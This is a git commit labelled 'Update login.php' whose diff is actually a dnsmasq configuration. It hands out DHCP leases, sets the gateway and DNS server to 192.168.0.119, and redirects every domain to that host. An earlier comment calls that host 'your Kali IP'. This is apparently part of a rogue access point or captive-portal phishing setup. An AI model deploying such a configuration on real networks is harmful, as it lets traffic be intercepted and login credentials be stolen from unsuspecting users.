1997a0b759ed2dc03d23d1df9bd6433da22dcd46
mitul37 <mitul.joarder@g.bracu.ac.bd>
2025-05-16 15:31:18 +0600

    Update login.php

--- login.php
+++ login.php
@@ -1,5 +1,7 @@
-interface=wlan0                     # Replace with your interface (eth0 or wlan0)
-dhcp-range=192.168.0.50,192.168.0.150,12h
-address=/#/192.168.0.119            # Redirect ALL domains to your Kali IP
+interface=wlan0
+dhcp-range=192.168.0.100,192.168.0.200,12h
+dhcp-option=3,192.168.0.119
+dhcp-option=6,192.168.0.119
+address=/#/192.168.0.119
 log-queries
 log-dhcp
